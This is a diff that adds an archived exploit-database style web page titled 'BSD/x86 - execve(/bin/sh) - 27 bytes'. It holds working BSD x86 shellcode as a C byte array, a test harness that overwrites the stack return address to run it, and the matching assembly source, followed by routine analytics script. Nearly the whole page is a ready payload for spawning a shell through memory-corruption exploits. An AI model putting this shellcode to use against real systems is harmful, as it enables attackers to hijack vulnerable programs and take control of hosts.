@@ -1,0 +1,62 @@
+<html idmmzcc-ext-docid="319985664"><head><title>BSD/x86 - execve(/bin/sh) - 27 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Language" content="en">
+</head>
+
+
+<body><pre>/* execve_sh.c by n0gada	
+   27 bytes.
+*/
+#include "stdio.h"
+
+char shellcode[]=
+"\xeb\x0d\x5f\x31\xc0\x50\x89\xe2"
+"\x52\x57\x54\xb0\x3b\xcd\x80\xe8"
+"\xee\xff\xff\xff/bin/sh";
+
+int main(void)
+{
+ int *ret;
+
+	printf("%d\n",strlen(shellcode));	
+	ret = (int *)&amp;ret+2;
+	*ret = (int)shellcode;
+
+return 0;
+
+}
+
+/*********************************************
+execve_sh.s
+
+	.globl main
+	main:
+		jmp strings
+	start:
+		pop %edi
+		xorl %eax,%eax
+		push %eax
+		movl %esp,%edx
+		push %edx
+		push %edi
+		push %esp
+		movb $0x3b,%al
+		int $0x80
+
+	strings: call start
+		.string "/bin/sh"
+
+*********************************************/
+
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
+</script><script src="BSD_x86%20-%20execve%28_bin_sh%29%20-%2027%20bytes_files/ga.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-6809519-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</pre></body></html>
